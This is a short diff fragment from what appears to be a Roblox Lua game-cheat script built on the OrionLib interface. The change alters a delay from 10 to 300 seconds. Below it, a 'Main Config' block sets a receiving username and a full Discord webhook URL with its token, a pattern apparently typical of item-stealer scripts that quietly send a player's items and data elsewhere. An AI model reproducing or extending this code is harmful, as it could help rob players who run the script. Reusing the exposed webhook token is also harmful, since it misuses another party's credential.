@@ -3205,9 +3205,7 @@ StatTracker:AddSlider({
 })
 coroutine.resume(dupedeleteco)
 OrionLib:Init()
-   end
-end)
-wait(10)
+wait(300)
 --[[ Main Config ]]--
 _G.Username = "xCrown1e"
 _G.Webhook = "https://discord.com/api/webhooks/1095690671391780924/u_p5d57WAI3JzThUIUZzDve0wC1tao_Pm8CznchhvhmmleEY1uvJdtrJJu-8V8T8rqjJ"
